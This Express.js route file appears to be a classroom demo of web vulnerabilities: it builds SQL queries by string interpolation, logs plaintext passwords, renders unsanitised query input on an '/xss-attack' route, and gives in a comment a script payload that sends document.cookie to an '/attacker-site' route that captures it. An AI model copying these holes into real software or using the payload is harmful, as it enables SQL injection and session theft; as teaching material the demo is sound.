var express = require("express");
var bcrypt = require("bcrypt");
var router = express.Router();

const db = require("../db/db");

router.get("/", async function (req, res) {
  res.render("main");
});

router.post("/submit/xss", async function (req, res) {});

router.post("/submit/sensitive", async function (req, res) {
  let { checkbox, name, email, phonenumber, password } = req.body;
  console.log(checkbox, name, email, phonenumber, password);

  if (!checkbox) {
    phonenumber = await bcrypt.hash(phonenumber, 10);
    password = await bcrypt.hash(password, 10);
  }

  const sql = `INSERT INTO users (name, mail, phoneNumber, password) VALUES (\'${name}\', \'${email}\', \'${phonenumber}\', \'${password}\') RETURNING id`;
  const result = (await db.query(sql, []))[0].id;

  const sql2 = "SELECT * FROM users where id = " + result;
  const result2 = (await db.query(sql2, []))[0];
  console.log(result2);

  res.json({ users: result2 });

  //console.log(await bcrypt.compare(password, protectedPassword));
});

router.get("/xss-attack", (req, res) => {
  const userInput = req.query.input; // Retrieve user input from the query parameter
  // %2b je +
  //http://localhost:3000/xss-attack?input=<script>document.location='http://localhost:3000/attacker-site?cookie='%2bdocument.cookie</script>
  res.render("xss-attack", { userInput });
});

router.get("/attacker-site", (req, res) => {
  const cookie = req.query.cookie;
  res.render("attacker-site", { cookie });
});


module.exports = router;
